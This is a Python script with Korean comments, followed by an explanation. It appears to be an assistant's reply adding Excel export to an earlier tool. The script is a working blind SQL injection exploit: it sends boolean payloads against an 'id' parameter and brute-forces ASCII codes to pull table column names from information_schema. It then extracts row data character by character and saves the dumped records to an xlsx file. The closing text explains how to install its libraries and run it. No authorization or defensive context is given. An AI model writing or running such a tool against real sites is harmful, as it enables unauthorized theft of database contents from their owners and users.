import requests
import pandas as pd  # pandas 라이브러리 추가
from openpyxl import Workbook  # 엑셀 저장을 위한 openpyxl

# 대상 URL 설정
url = "http://example.com/vulnerable_page.php"  # 테스트할 대상 URL
param_name = "id"  # 공격할 파라미터 이름 (예: id)

# 참/거짓 판별을 위한 응답의 키워드
true_response_indicator = "Welcome"  # 참일 때 나타나는 응답 내용 (사용자 환경에 맞게 수정)

# 참/거짓 판별 함수
def is_true_response(response):
    return true_response_indicator in response.text

# 테이블의 컬럼 이름 추출 함수
def find_column_names(table_name):
    column_names = []
    for index in range(0, 100):  # 최대 100개의 컬럼을 가정
        column_name = ""
        for i in range(1, 50):  # 컬럼 이름의 최대 길이를 50자로 가정
            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1),{i},1)))={char_code}--"
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    column_name += chr(char_code)
                    print(f"[+] Found character: {chr(char_code)} at position {i} for column {index + 1}")
                    break

            if char_code == 126 and len(column_name) == i - 1:
                break

        if column_name:
            print(f"[+] Column {index + 1} name: {column_name}")
            column_names.append(column_name)
        else:
            break
    return column_names

# 특정 컬럼에서 데이터 추출 함수
def find_column_data(table_name, column_name):
    column_data = []
    for index in range(0, 100):  # 최대 100개의 데이터 행을 가정
        row_data = ""
        for i in range(1, 50):  # 데이터의 최대 길이를 50자로 가정
            for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
                payload = f"' OR (SELECT ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{i},1)))={char_code}--"
                params = {param_name: payload}
                response = requests.get(url, params=params)

                if is_true_response(response):
                    row_data += chr(char_code)
                    print(f"[+] Found character: {chr(char_code)} at position {i} for row {index + 1}")
                    break

            if char_code == 126 and len(row_data) == i - 1:
                break

        if row_data:
            print(f"[+] Row {index + 1} data: {row_data}")
            column_data.append(row_data)
        else:
            break
    return column_data

# 엑셀 파일로 데이터를 저장하는 함수
def save_to_excel(data, column_name, table_name):
    # pandas DataFrame으로 변환
    df = pd.DataFrame(data, columns=[column_name])

    # 엑셀 파일로 저장 (파일 이름은 테이블과 컬럼 이름을 사용)
    file_name = f"{table_name}_{column_name}_data.xlsx"
    df.to_excel(file_name, index=False)
    print(f"[+] Data has been saved to {file_name}")

# 메인 실행 함수
if __name__ == "__main__":
    # 1. 테이블 이름 입력
    table_name = input("Enter the table name: ")

    # 2. 해당 테이블의 컬럼 이름 추출
    print(f"[INFO] Extracting column names for table: {table_name}")
    column_names = find_column_names(table_name)

    if column_names:
        print(f"[+] Found column names: {column_names}")

        # 3. 사용자가 추출할 컬럼을 선택
        column_name = input(f"Enter the column name from {column_names}: ")

        if column_name in column_names:
            # 4. 해당 컬럼의 데이터 추출
            print(f"[INFO] Extracting data for column: {column_name}")
            column_data = find_column_data(table_name, column_name)

            # 5. 데이터를 엑셀로 저장
            save_to_excel(column_data, column_name, table_name)
        else:
            print("[-] Invalid column name.")
    else:
        print("[-] Could not find any column names.")


추가된 부분 설명:
1. pandas와 openpyxl 사용:
pandas는 데이터 처리 및 엑셀 파일로 변환하는 데 사용됩니다.
openpyxl은 엑셀 파일을 다루기 위해 사용됩니다. pandas는 엑셀 파일을 생성하기 위해 openpyxl이 필요합니다.



2. 엑셀로 데이터 저장 (save_to_excel()):
pandas의 DataFrame을 사용하여 추출된 데이터를 구조화한 후, 엑셀 파일로 저장합니다.
파일 이름은 테이블 이름과 컬럼 이름을 기반으로 자동으로 지정됩니다.



3. 데이터프레임 생성:
추출한 컬럼 데이터를 pandas의 DataFrame으로 변환하여 엑셀로 저장합니다. 이를 통해 쉽게 구조화된 데이터를 엑셀로 내보낼 수 있습니다.




설치해야 할 라이브러리:
이 스크립트를 실행하기 전에 pandas와 openpyxl 라이브러리를 설치해야 합니다. 다음 명령어로 설치할 수 있습니다.
pip install pandas openpyxl

사용 방법:
1. 테이블 이름 입력: 사용자가 추출하고자 하는 테이블 이름을 입력합니다.
2. 컬럼 이름 추출: 테이블에서 추출한 컬럼 이름을 선택합니다.
3. 컬럼 데이터 추출: 선택된 컬럼에서 데이터를 추출하고 엑셀 파일로 저장합니다.
저장된 파일은 테이블_컬럼_이름.xlsx 형식으로 저장됩니다.
